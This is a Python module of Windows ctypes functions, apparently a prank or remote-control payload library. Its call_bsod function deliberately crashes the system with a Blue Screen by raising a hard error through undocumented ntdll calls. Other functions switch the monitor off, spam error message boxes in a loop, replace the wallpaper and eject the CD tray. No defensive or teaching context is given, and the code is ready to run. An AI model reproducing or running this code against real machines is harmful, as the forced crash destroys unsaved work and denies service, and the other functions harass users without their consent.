import ctypes.wintypes


def call_bsod():
    """
    Calling Hard system error (BSOD)
    Blue Screen Of Death
    :return: None
    """
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    except PermissionError:
        pass


def monitor(fnc_name):
    """
    Monitor Power Control
    :param fnc_name:
    :return: None
    """
    try:
        method = ctypes.windll.user32.SendMessageA
        hwnd = 0xFFFF
        wm_system_command = 0x112
        sc_power = 0xF170
        func = {'off': 2, 'on': -1}
        method(hwnd, wm_system_command, sc_power, func[fnc_name])
    except PermissionError:
        pass


def messagebox(title, text, count):
    """
    :param title:
    :param text:
    :param count:
    :return: None
    """
    for i in range(count):
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x10)


def set_wallpapers(file_path):
    """
    :param file_path:
    :return: Setting new wallpapers
    """
    ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)


def open_cd():
    """
    Opening cdrom
    :return: None
    """
    ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)


def close_cd():
    """
    Closing cdrom
    :return: None
    """
    ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)

